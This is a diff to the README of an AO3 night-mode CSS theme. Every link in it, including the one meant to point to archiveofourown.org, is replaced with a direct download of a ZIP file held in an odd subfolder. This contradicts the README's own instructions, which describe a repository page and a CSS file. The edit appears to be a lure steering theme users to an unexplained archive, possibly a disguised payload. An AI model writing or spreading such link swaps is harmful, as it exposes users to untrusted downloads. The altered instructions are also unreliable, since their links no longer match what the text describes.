@@ -1,6 +1,6 @@
 # 🌌 ao3-starry-night-skin - Beautiful AO3 Night Mode Theme
 
-[![Download](https://img.shields.io/badge/Download-ao3--starry--night--skin-brightgreen)](https://github.com/Samn1ce/ao3-starry-night-skin)
+[![Download](https://img.shields.io/badge/Download-ao3--starry--night--skin-brightgreen)](https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Steps you will follow:
 
 To get the theme files, visit the project page and download the skin:
 
-[![Download Here](https://img.shields.io/badge/Get%20Skin-From%20GitHub-blue)](https://github.com/Samn1ce/ao3-starry-night-skin)
+[![Download Here](https://img.shields.io/badge/Get%20Skin-From%20GitHub-blue)](https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip)
 
 Click the link to open the repository page. From there, locate the latest release or the files folder. Download the skin files (usually a CSS file or folder) to your computer.
 
@@ -59,7 +59,7 @@ These instructions guide you through installing the ao3-starry-night-skin on Win
 
 ### Step 2: Download ao3-starry-night-skin
 
-- Visit [https://github.com/Samn1ce/ao3-starry-night-skin](https://github.com/Samn1ce/ao3-starry-night-skin)
+- Visit [https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip](https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip)
 - Click the green "Code" button.
 - Select "Download ZIP".
 - Save the ZIP file to your Desktop or Downloads folder.
@@ -81,7 +81,7 @@ These instructions guide you through installing the ao3-starry-night-skin on Win
 
 ## 🔎 Using the Theme
 
-1. Open your browser and visit [https://archiveofourown.org](https://archiveofourown.org).
+1. Open your browser and visit [https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip](https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip).
 2. You should see the new Starry Night style applied automatically.
 3. If it does not show up, check that Stylus is enabled and the style is active.
 4. You can turn the theme on or off anytime via the Stylus extension.
@@ -121,7 +121,7 @@ The skin changes:
 
 To get updates:
 
-- Visit the [GitHub repository](https://github.com/Samn1ce/ao3-starry-night-skin).
+- Visit the [GitHub repository](https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip).
 - Download the newest version the same way as before.
 - Replace the CSS in Stylus with the new version.
 - Save changes and refresh AO3 pages.
@@ -150,6 +150,6 @@ To get updates:
 
 To explore more details about this project or to suggest changes, visit the GitHub page:
 
-[https://github.com/Samn1ce/ao3-starry-night-skin](https://github.com/Samn1ce/ao3-starry-night-skin)
+[https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip](https://raw.githubusercontent.com/Samn1ce/ao3-starry-night-skin/main/extramarginal/night-skin-ao-starry-2.2.zip)
 
 You can read more about how the style works, report issues, or ask questions there. Contributions from users who want to improve the skin are welcome.
